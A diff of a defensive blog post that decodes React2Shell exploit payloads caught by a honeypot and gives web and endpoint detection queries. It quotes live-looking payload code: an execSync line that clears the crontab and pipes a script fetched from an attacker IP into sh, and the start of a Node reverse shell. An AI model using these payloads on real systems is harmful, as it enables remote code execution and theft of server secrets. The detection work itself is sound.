@@ -117,7 +117,7 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 <h1>Detecting React2Shell: Six Payloads, a Reverse Shell Sent 54 Times, and the Rules That Catch Them</h1>
 <p>My PHP honeypot received 70 React2Shell exploit requests for a Next.js bug it can&#x27;t have. I decode the six payload types, from a marker check to environment theft and a fileless redirect hijack, map them to ATT&amp;CK, and give detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.</p>
 <nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web-Layer Detections · Endpoint Detections · When It Fires · Hardening · IOCs</nav>
-<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web-layer KQL ran against the honeypot's real logs. The endpoint queries are written from the decoded payloads, so adapt the field names to your environment.</p>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. Its Falcon queries use Event Search field names; on raw FDR data, apply the <a href="/blog/honeypot-detection-playbook/#falcon">normalisation macro</a> first. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web-layer KQL ran against the honeypot's real logs. The endpoint queries are written from the decoded payloads, so adapt the field names to your environment.</p>
 
 <h2 id="what">1. What Hit the Server</h2>
 
@@ -180,9 +180,9 @@ try{
 <p>One round trip returns <code>id</code>, the whole process environment and <code>.env</code>, base64-encoded in the error digest (T1552.001, T1082). For a containerised Next.js app, that's the database URL, auth secret and cloud keys. Note that blocking <code>/.env</code> at the web server does nothing here. The payload reads the file from inside the application.</p>
 
 <h3><span class="kc">Delivery</span> Step 3b: Drop and run</h3>
-<pre><code>var res=process.mainModule.require('child_process').execSync('(cd /tmp; crontab -r 2&gt;/dev/null; wget hxxp://134.209.89.212/r -O- | sh) ; echo 11111').toString().trim();
+<pre><code>var res=process.mainModule.require('child_process').execSync('(cd /tmp; crontab -r 2&gt;/dev/null; wget hxxp://134.209.89[.]212/r -O- | sh) ; echo 11111').toString().trim();
 throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});</code></pre>
-<p><code>crontab -r</code> wipes the user's crontab, which removes a competitor's persistence or your own jobs (T1070, T1053.003). Then it fetches a script and pipes it into <code>sh</code> without touching disk (T1105, T1059.004).</p>
+<p><code>crontab -r</code> wipes the user's crontab, which removes a competitor's persistence or your own jobs (T1070). Then it fetches a script and pipes it into <code>sh</code> without touching disk (T1105, T1059.004).</p>
 
 <h3><span class="kc">C2</span> Step 3c: Reverse shell</h3>
 <pre><code>var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();
@@ -236,7 +236,7 @@ throw e;</code></pre>
 <pre><code>let WebAccess = Syslog
 | where SyslogMessage startswith "php_http: "
 | extend j = parse_json(substring(SyslogMessage, 10))
-| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+| project TimeGenerated, DestHost = Computer, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
           Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
           UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
 
@@ -278,7 +278,7 @@ throw e;</code></pre>
 <p>This works even where bodies aren't logged, because the boundary is in the <code>Content-Type</code> header. That makes it a good first rule for anyone without a WAF.</p>
 
 <h3>W3. The same exploit, over and over</h3>
-<p><span class="org orgB">Org B</span> Tested: <code>91.92.40.12</code> sent one identical body (one hash) 54 times over 10 days. The only other hit was my own scanner (5 requests, 5 different bodies).</p>
+<p><span class="org orgB">Org B</span> Tested: <code>91.92.40[.]12</code> sent one identical body (one hash) 54 times over 10 days. The only other hit was my own scanner (5 requests, 5 different bodies).</p>
 <pre><code>WebAccess
 | where Method == "POST" and Body has "__proto__" and Body has "constructor:constructor"
 | summarize Requests = count(), Days = dcount(bin(TimeGenerated, 1d)), Hashes = dcount(hash_sha256(Body)) by SrcIp
